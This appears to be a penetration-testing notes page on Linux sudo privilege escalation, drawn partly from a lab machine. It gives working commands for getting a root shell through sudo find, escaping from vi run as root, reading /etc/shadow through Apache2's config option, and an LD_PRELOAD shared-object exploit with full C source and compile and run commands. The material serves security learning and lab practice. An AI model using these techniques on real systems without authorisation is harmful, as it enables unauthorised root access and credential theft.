# Sudo

sudo -l ### check sudo access

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

Leverage find command

```
sudo find . -exec /bin/sh \; -quit
```

## vi

```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The contents of the file don’t actually matter here. What we are wanting is to have an active session of **vi** running which we can then use to leverage to a root shell, since **vi** will be running as root already. How does this work? Well within vi you actually have the ability to run terminal commands as a feature, not a bug. So if we have **vi** open, running as root, and we tell the terminal to spawn a shell, I’m sure you can guess _what_ shell is going to be spawned? >:)

<figure><img src="https://miro.medium.com/v2/resize:fit:111/1*1Nm7WSXt842QNht2WnPR6w.png" alt="" height="101" width="111"><figcaption></figcaption></figure>

```
root@vaccine:/var/lib/postgresql# whoami
root

```

## Leverage application functions

Apache2 has an option that supports loading alternative configuration files (-f). Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

## **Leverage LD\_PRELOAD**

On some systems, you may see the LD\_PRELOAD environment option.

\


![](https://i.imgur.com/gGstS69.png)

LD\_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld\_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD\_PRELOAD. If the "env\_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD\_PRELOAD option will be ignored if the real user ID is different from the effective user ID.\


The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD\_PRELOAD (with the env\_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD\_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

\#include \<stdio.h>\
\#include \<sys/types.h>\
\#include \<stdlib.h>\
\
void \_init() {\
unsetenv("LD\_PRELOAD");\
setgid(0);\
setuid(0);\
system("/bin/bash");\
}\


We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

\


![](https://i.imgur.com/HxbszMW.png)

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD\_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.



![](https://i.imgur.com/1YwARyZ.png)

\
